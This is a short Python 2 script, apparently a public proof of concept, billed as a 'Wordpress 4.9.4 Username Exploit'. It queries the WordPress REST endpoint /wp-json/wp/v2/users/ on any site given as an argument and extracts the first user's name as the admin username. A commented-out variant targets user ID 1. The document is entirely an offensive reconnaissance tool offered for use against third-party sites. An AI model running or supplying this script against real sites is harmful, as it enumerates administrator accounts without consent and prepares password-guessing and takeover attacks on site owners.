#!/usr/bin/env python
#!-*- coding:utf-8 -*-

import urllib
import json
import re
import sys
#OsmanKandemir


#exp = "/wp-json/wp/v2/users/1"
#url = sys.argv[1] + exp
#res = urllib.urlopen(url)
#d = json.loads(res.read())
#print "ID : " + str(d["id"])+"\n"+"Admin username : " + str(d["name"])

print """

	 _ _ _           _                     
	| | | |___ ___ _| |___ ___ ___ ___ ___ 
	| | | | . |  _| . | . |  _| -_|_ -|_ -|
	|_____|___|_| |___|  _|_| |___|___|___|
	                  |_|       

    Name : Wordpress 4.9.4 Username Exploit
    	  Directory : wp-json/wp/v2/users/

      """          

		
#Using python wp-4.9.4_UsernameExp_Python.py SİTE
exp = "/wp-json/wp/v2/users/"
url = sys.argv[1] + exp
res = urllib.urlopen(url)
re1 = res.read()

a = re.search('"name":".+","u',re1)
if a:
	print "\nAdmin Username : "+a.group(0).replace('"name":"',"").replace('","u',"")
